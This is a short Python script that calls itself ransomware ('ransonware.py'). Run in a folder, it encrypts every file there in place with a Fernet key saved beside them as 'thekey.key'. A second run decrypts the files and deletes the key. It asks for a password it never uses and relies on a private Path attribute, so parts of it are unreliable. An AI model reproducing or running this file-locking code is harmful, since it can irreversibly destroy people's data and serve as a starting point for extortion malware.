import os
from cryptography.fernet import Fernet
from pathlib import Path
from getpass import getpass
import sys


password = getpass()

pasta = ""
#pasta = "C:\Temp\BACKUP\Pasta"
# endereco = "C:\\Users\\rodol\\Dropbox\\Pasta"

if pasta == "":
    os.chdir(".")
else:
    os.chdir(pasta)

keyFile = "thekey.key"

if pasta == "":
    endereco = keyFile
else:
    endereco = pasta + "\\"+keyFile

crypto = True

key_file = Path(endereco)
if key_file.exists():
    crypto = False
    print("Decryptography")
else:
    print("Cryptography")
    
selfName = Path(sys.argv[0])._cparts[len(Path(sys.argv[0])._cparts) - 1]


files = []
for file in os.listdir():
    if file == "ransonware.py" or file == "thekey.key" or file == "desktop.ini" or file == ".gitignore"  or file == "win_createexe.sh" or file == "linux_createexe.sh" or file == "create exe.txt" or file == "pythonScriptName.spec" or file == "ransonware.spec" or file == selfName:
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

if crypto:
    key = Fernet.generate_key()
    with open(keyFile,"wb") as thekey:
        thekey.write(key);
else:
    with open(keyFile, "rb") as thekey:
        key = thekey.read()
    # kdf = hashlib.pbkdf2_hmac('sha256', password.encode(), key, 100000)
    # key = base64.urlsafe_b64decode(kdf)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    if crypto:
        contents_cryp = Fernet(key).encrypt(contents)
    else:
        contents_cryp = Fernet(key).decrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_cryp)
        
if crypto:
    print('')
    # with open(keyFile, "rb") as thefile:
    #     contents = thefile.read()
    # kdf = hashlib.pbkdf2_hmac('sha256', password.encode(), contents, 100000)
    # key = base64.urlsafe_b64encode(kdf)
    # with open(keyFile,"wb") as thekey:
    #     thekey.write(key);
else:
    os.remove(endereco)
    
if crypto:
    input('Crypto finished: Keep with yourself the thekey.key in security place.')
else:
    input('Decrypto finished: Your file key was deleted.')